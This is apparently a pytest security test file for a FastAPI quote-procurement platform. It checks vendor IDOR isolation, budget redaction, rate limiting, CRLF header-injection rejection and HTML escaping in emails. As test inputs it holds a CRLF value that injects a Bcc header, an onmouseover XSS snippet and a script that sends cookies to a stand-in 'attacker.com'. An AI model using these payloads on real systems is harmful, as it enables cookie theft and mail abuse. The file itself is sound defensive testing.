"""Security hardening, IDOR isolation, budget confidentiality, and rate limiting tests (Quote Subphase 7)."""

from datetime import datetime, timedelta, timezone
from decimal import Decimal
from typing import Tuple
import uuid
import pytest
from fastapi.testclient import TestClient
from sqlalchemy import create_engine
from sqlalchemy.orm import Session as SASession

from app.core.config import Settings, get_settings
from app.core.security import hash_password
from app.core.session import SESSION_COOKIE_NAME, generate_session_token, hash_session_token
from app.db.models.quote import (
    QuoteRequest,
    QuoteRequestStatus,
    QuoteUrgency,
    QuoteVendorMatch,
    VendorMatchStatus,
)
from app.db.models.session import UserSession
from app.db.models.user import User
from app.main import create_app
from app.services.email.template import render_commercial_quote_email

settings = get_settings()
TEST_DB_URL = settings.TEST_DATABASE_URL or settings.DATABASE_URL
TEST_MIGRATION_URL = settings.TEST_MIGRATION_URL or settings.MIGRATION_DATABASE_URL

CSRF_HEADERS = {"X-Requested-With": "XMLHttpRequest"}


@pytest.fixture(scope="module")
def app_instance():
    """Create test application bound to isolated test database."""
    test_settings = Settings(
        ENVIRONMENT="test",
        DATABASE_URL=TEST_DB_URL,
        EMAIL_BACKEND="console",
    )
    app = create_app(test_settings)
    yield app


@pytest.fixture
def client(app_instance):
    """Yield test client with default CSRF header configured."""
    with TestClient(app_instance, headers=CSRF_HEADERS) as test_client:
        yield test_client


@pytest.fixture(scope="module")
def sync_engine():
    """Create a synchronous engine for test fixture setup."""
    engine = create_engine(TEST_MIGRATION_URL)
    yield engine
    engine.dispose()


@pytest.fixture(autouse=True)
def cleanup_quotes(sync_engine):
    """Clean up quote records and test users before and after each test."""
    def _clean():
        with sync_engine.connect() as conn:
            conn.exec_driver_sql("DELETE FROM business.quote_email_dispatches;")
            conn.exec_driver_sql("DELETE FROM business.quote_vendor_matches;")
            conn.exec_driver_sql("DELETE FROM business.quote_requests;")
            conn.exec_driver_sql("DELETE FROM core.user_sessions;")
            conn.exec_driver_sql("DELETE FROM core.users WHERE username LIKE 'qsec_%%';")
            conn.commit()

    _clean()
    yield
    _clean()


def create_test_user(sync_engine, prefix: str, company: str) -> Tuple[User, str]:
    """Helper creating user and active session with guaranteed unique username and email."""
    uid = uuid.uuid4().hex[:8]
    with SASession(sync_engine, expire_on_commit=False) as session:
        user = User(
            id=uuid.uuid4(),
            username=f"qsec_{prefix}_{uid}",
            email=f"qsec_{prefix}_{uid}@example.com",
            password_hash=hash_password("ValidP@ssw0rd123!"),
            full_name=f"Full {prefix}",
            company_name=company,
            job_title="Executive",
            is_active=True,
        )
        session.add(user)
        session.flush()

        raw_token = generate_session_token()
        session.add(
            UserSession(
                user_id=user.id,
                token_hash=hash_session_token(raw_token),
                expires_at=datetime.now(timezone.utc) + timedelta(hours=24),
                last_accessed_at=datetime.now(timezone.utc),
            )
        )
        session.commit()
        return user, raw_token


def test_idor_isolation_unauthorized_vendor_cannot_access_ask(sync_engine, client):
    """Verify non-matched vendors receive 404 when querying an ask they are not matched with."""
    customer, cust_token = create_test_user(sync_engine, "cust", "Client Alpha")
    vendor1, v1_token = create_test_user(sync_engine, "v1", "Supplier Alpha")
    vendor2, v2_token = create_test_user(sync_engine, "v2", "Supplier Beta (Competitor)")

    with SASession(sync_engine, expire_on_commit=False) as session:
        ask = QuoteRequest(
            id=uuid.uuid4(),
            customer_id=customer.id,
            title="Confidential Heavy Machinery Procurement",
            product_name="Excavator 50T",
            quantity=Decimal("2.0"),
            quantity_unit="UNITS",
            delivery_location="Hazira Port",
            urgency=QuoteUrgency.IMMEDIATE,
            status=QuoteRequestStatus.MATCHED,
            technical_specifications={"tier": "Tier 4 Final"},
        )
        session.add(ask)
        session.flush()

        # Match only vendor1
        match = QuoteVendorMatch(
            id=uuid.uuid4(),
            quote_request_id=ask.id,
            vendor_id=vendor1.id,
            match_score=Decimal("94.0"),
            match_reasons=["Machinery Specialist"],
            status=VendorMatchStatus.PENDING_REVIEW,
        )
        session.add(match)
        session.commit()

    # Vendor 1 (matched) CAN view ask
    client.cookies.set(SESSION_COOKIE_NAME, v1_token)
    r1 = client.get(f"/converge-api/v1/quotes/{ask.id}")
    assert r1.status_code == 200
    assert r1.json()["title"] == "Confidential Heavy Machinery Procurement"

    # Vendor 2 (unmatched) receives 404 (IDOR blocked)
    client.cookies.set(SESSION_COOKIE_NAME, v2_token)
    r2 = client.get(f"/converge-api/v1/quotes/{ask.id}")
    assert r2.status_code == 404


def test_idor_isolation_cannot_dispatch_quote_or_decline_on_behalf_of_others(sync_engine, client):
    """Verify unauthorized vendors cannot dispatch a quote or decline another vendor's match."""
    customer, _ = create_test_user(sync_engine, "cust", "Buyer Co")
    vendor1, _ = create_test_user(sync_engine, "v1", "Vendor 1 Co")
    vendor2, v2_token = create_test_user(sync_engine, "v2", "Vendor 2 Co")

    with SASession(sync_engine, expire_on_commit=False) as session:
        ask = QuoteRequest(
            id=uuid.uuid4(),
            customer_id=customer.id,
            title="Steel Rebar 500 MT",
            product_name="TMT 550D Steel Rebar",
            quantity=Decimal("500.0"),
            quantity_unit="MT",
            status=QuoteRequestStatus.MATCHED,
        )
        session.add(ask)
        session.flush()

        match1 = QuoteVendorMatch(
            id=uuid.uuid4(),
            quote_request_id=ask.id,
            vendor_id=vendor1.id,
            match_score=Decimal("90.0"),
            status=VendorMatchStatus.PENDING_REVIEW,
        )
        session.add(match1)
        session.commit()

    # Vendor 2 attempts to send quote on Vendor 1's match
    client.cookies.set(SESSION_COOKIE_NAME, v2_token)
    quote_payload = {
        "unit_price": 54000.0,
        "total_value": 27000000.0,
        "incoterm": "EXW",
        "lead_time_days": 10,
        "validity_days": 14,
        "payment_terms": "100% LC",
    }
    r_hack_quote = client.post(f"/converge-api/v1/quotes/matches/{match1.id}/send-email", json=quote_payload)
    assert r_hack_quote.status_code == 404

    # Vendor 2 attempts to decline Vendor 1's match
    r_hack_decline = client.post(f"/converge-api/v1/quotes/matches/{match1.id}/decline")
    assert r_hack_decline.status_code == 404


def test_budget_confidentiality_redaction_gate(sync_engine, client):
    """Verify that private target reserve budgets are redacted from vendors when is_budget_public=False."""
    customer, cust_token = create_test_user(sync_engine, "cust", "Private Buyer")
    vendor, vend_token = create_test_user(sync_engine, "vend", "Private Supplier")

    with SASession(sync_engine, expire_on_commit=False) as session:
        ask = QuoteRequest(
            id=uuid.uuid4(),
            customer_id=customer.id,
            title="Strategic Clinker Buy",
            product_name="Ordinary Clinker",
            quantity=Decimal("5000.0"),
            quantity_unit="MT",
            target_price_indication=Decimal("2800.0"),
            is_budget_public=False,  # Confidential!
            status=QuoteRequestStatus.MATCHED,
        )
        session.add(ask)
        session.flush()

        match = QuoteVendorMatch(
            id=uuid.uuid4(),
            quote_request_id=ask.id,
            vendor_id=vendor.id,
            match_score=Decimal("91.0"),
            status=VendorMatchStatus.PENDING_REVIEW,
        )
        session.add(match)
        session.commit()

    # Vendor checks ask -> target_price_indication must be None
    client.cookies.set(SESSION_COOKIE_NAME, vend_token)
    r_vendor = client.get(f"/converge-api/v1/quotes/{ask.id}")
    assert r_vendor.status_code == 200
    assert r_vendor.json()["target_price_indication"] is None
    assert r_vendor.json()["is_budget_public"] is False

    # Customer checks ask -> target_price_indication is visible to author
    client.cookies.set(SESSION_COOKIE_NAME, cust_token)
    r_cust = client.get(f"/converge-api/v1/quotes/{ask.id}")
    assert r_cust.status_code == 200
    assert float(r_cust.json()["target_price_indication"]) == 2800.0


def test_rate_limiting_and_rapid_dispatch_throttling(sync_engine, client):
    """Verify that rapid successive quote email dispatches are throttled (5s cooldown) and capped at 5 max."""
    customer, _ = create_test_user(sync_engine, "cust", "Buyer Corp")
    vendor, vend_token = create_test_user(sync_engine, "vend", "Supplier Corp")

    with SASession(sync_engine, expire_on_commit=False) as session:
        ask = QuoteRequest(
            id=uuid.uuid4(),
            customer_id=customer.id,
            title="Bulk Fly Ash Supply",
            product_name="Class F Fly Ash",
            quantity=Decimal("1000.0"),
            status=QuoteRequestStatus.MATCHED,
        )
        session.add(ask)
        session.flush()

        match = QuoteVendorMatch(
            id=uuid.uuid4(),
            quote_request_id=ask.id,
            vendor_id=vendor.id,
            match_score=Decimal("95.0"),
            status=VendorMatchStatus.PENDING_REVIEW,
        )
        session.add(match)
        session.commit()

    client.cookies.set(SESSION_COOKIE_NAME, vend_token)
    payload = {
        "unit_price": 1200.0,
        "total_value": 1200000.0,
        "incoterm": "EXW",
        "lead_time_days": 7,
        "validity_days": 14,
        "payment_terms": "Immediate NEFT",
    }

    # Dispatch 1: OK
    r1 = client.post(f"/converge-api/v1/quotes/matches/{match.id}/send-email", json=payload)
    assert r1.status_code == 200

    # Rapid Dispatch 2 (within 5 seconds) -> Must be throttled with 429
    r2 = client.post(f"/converge-api/v1/quotes/matches/{match.id}/send-email", json=payload)
    assert r2.status_code == 429
    assert "Throttled" in r2.json()["detail"]


def test_crlf_header_injection_rejection(sync_engine, client):
    """Verify that CRLF newline characters in single-line headers like incoterm are rejected."""
    customer, _ = create_test_user(sync_engine, "cust", "Target Corp")
    vendor, vend_token = create_test_user(sync_engine, "vend", "Attacker Corp")

    with SASession(sync_engine, expire_on_commit=False) as session:
        ask = QuoteRequest(
            id=uuid.uuid4(),
            customer_id=customer.id,
            title="Standard Concrete Mix",
            product_name="Ready Mix Concrete M30",
            quantity=Decimal("100.0"),
            status=QuoteRequestStatus.MATCHED,
        )
        session.add(ask)
        session.flush()

        match = QuoteVendorMatch(
            id=uuid.uuid4(),
            quote_request_id=ask.id,
            vendor_id=vendor.id,
            match_score=Decimal("90.0"),
            status=VendorMatchStatus.PENDING_REVIEW,
        )
        session.add(match)
        session.commit()

    client.cookies.set(SESSION_COOKIE_NAME, vend_token)
    malicious_payload = {
        "unit_price": 4500.0,
        "total_value": 450000.0,
        "incoterm": "EXW\r\nBcc:x@y.z",  # 14 chars CRLF Injection attempt
        "lead_time_days": 3,
        "validity_days": 10,
        "payment_terms": "Advance",
    }
    r = client.post(f"/converge-api/v1/quotes/matches/{match.id}/send-email", json=malicious_payload)
    assert r.status_code == 422
    assert "Security violation" in r.json()["detail"]


def test_html_xss_escaping_in_rendered_email():
    """Verify that script tags and malicious HTML in commercial notes are neutralized via HTML entity encoding."""
    html_body, text_body = render_commercial_quote_email(
        quote_reference="QUO-2026-XSS01",
        product_name="LC3 Cement",
        quantity=Decimal("1000"),
        unit="MT",
        unit_price=Decimal("3500"),
        total_value=Decimal("3500000"),
        currency="INR",
        incoterm="EXW",
        lead_time_days=14,
        delivery_location="Mumbai",
        payment_terms="<b onmouseover=alert(1)>20% Advance</b>",
        validity_days=14,
        expiry_date_str="Nov 23, 2026",
        customer_name="Sanjana Mahajan",
        customer_company="InfraTech",
        customer_agent_name="Procurement AI Agent",
        vendor_delegate_name="Maahi Sharma",
        vendor_company="Deccan Cement",
        sender_email="sanjana.mahajan@sofueled.com",
        commercial_notes="<script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
    )

    # Must NOT contain raw unescaped script tag
    assert "<script>" not in html_body
    # Must contain HTML-escaped entity representation
    assert "&lt;script&gt;" in html_body
    assert "&lt;b onmouseover=alert(1)&gt;" in html_body
